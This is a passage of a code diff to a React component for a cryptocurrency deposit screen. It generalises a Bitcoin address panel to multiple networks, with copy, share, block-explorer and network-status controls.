+                    <div className="p-3 rounded-xl bg-neutral-950 border border-neutral-800 font-mono text-xs text-amber-300 break-all select-all">
+                      {activeDepositInfo.address}
+                    </div>
                   </div>
-                )}
 
-                <div className="rounded-xl border border-neutral-800/80 bg-neutral-950/60 p-3 text-[11px] text-neutral-400 text-left space-y-1">
-                  <div className="font-semibold text-neutral-300 flex items-center justify-between">
-                    <span>Network: Bitcoin Mainnet (Native SegWit Bech32)</span>
-                    <a
-                      href={`https://mempool.space/address/${USER_INVOICE_ADDRESS}`}
-                      target="_blank"
-                      rel="noopener noreferrer"
-                      className="text-amber-400 hover:underline flex items-center gap-1 text-[10px] font-mono"
+                  <div className="flex flex-wrap items-center justify-center gap-2.5 pt-1">
+                    <button
+                      onClick={() => handleCopy(activeDepositInfo.address, activeDepositInfo.id)}
+                      className="flex items-center gap-1.5 rounded-xl border border-neutral-700 bg-neutral-800 hover:bg-neutral-700 px-4 py-2.5 text-xs font-semibold text-neutral-100 transition-colors cursor-pointer"
                     >
-                      <span>Mempool Explorer</span>
-                      <ExternalLink className="h-3 w-3" />
-                    </a>
+                      {copiedText === activeDepositInfo.id ? <Check className="h-4 w-4 text-emerald-400" /> : <Copy className="h-4 w-4" />}
+                      <span>{copiedText === activeDepositInfo.id ? 'Address Copied!' : 'Copy Address'}</span>
+                    </button>
+
+                    <button
+                      onClick={() => handleShareAddress()}
+                      className="flex items-center gap-1.5 rounded-xl border border-neutral-700 bg-neutral-800 hover:bg-neutral-700 px-3.5 py-2.5 text-xs font-semibold text-neutral-200 transition-colors cursor-pointer"
+                    >
+                      <Share2 className="h-4 w-4 text-amber-400" />
+                      <span>Share</span>
+                    </button>
+
+                    <button
+                      onClick={handleCheckMempool}
+                      disabled={isCheckingMempool}
+                      className="flex items-center gap-1.5 rounded-xl border border-amber-500/40 bg-amber-500/15 hover:bg-amber-500/25 px-4 py-2.5 text-xs font-semibold text-amber-300 transition-colors cursor-pointer disabled:opacity-50"
+                    >
+                      <RefreshCw className={`h-4 w-4 ${isCheckingMempool ? 'animate-spin' : ''}`} />
+                      <span>{isCheckingMempool ? 'Scanning Network...' : 'Check Network Status'}</span>
+                    </button>
                   </div>
-                  <p>
-                    Send BTC / Satoshis only to this address. Transactions broadcast to this address will automatically sync with your ledger once confirmed in an on-chain block.
-                  </p>
+
+                  {mempoolNotice && (
+                    <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-3 text-xs text-emerald-300 flex items-center justify-center gap-2 font-mono">
+                      <Activity className="h-4 w-4 text-emerald-400 shrink-0" />
+                      <span>{mempoolNotice}</span>
+                    </div>
+                  )}
+
+                  <div className="rounded-xl border border-neutral-800/80 bg-neutral-950/60 p-3 text-[11px] text-neutral-400 text-left space-y-1">
+                    <div className="font-semibold text-neutral-300 flex items-center justify-between">
+                      <span>Network: {activeDepositInfo.network}</span>
+                      <a
+                        href={activeDepositInfo.explorerUrl}
+                        target="_blank"
+                        rel="noopener noreferrer"
+                        className="text-amber-400 hover:underline flex items-center gap-1 text-[10px] font-mono"
+                      >
+                        <span>Block Explorer</span>
+                        <ExternalLink className="h-3 w-3" />
+                      </a>
+                    </div>
+                    <p>
+                      Send {activeDepositInfo.symbol} strictly via {activeDepositInfo.network}. Transfers will automatically confirm on-chain and credit your account balance.
+                    </p>
+                  </div>
                 </div>
-              </div>
-            )}
+              );
+            })()}
 
             {/* Mode 2: Dynamic Lightning Invoice */}
-            {depositMode === 'lightning' && (
+            {depositCurrency === 'lightning' && (
               <div className="space-y-4">
                 <div className="space-y-2">
                   <label className="text-xs text-neutral-300 font-medium">
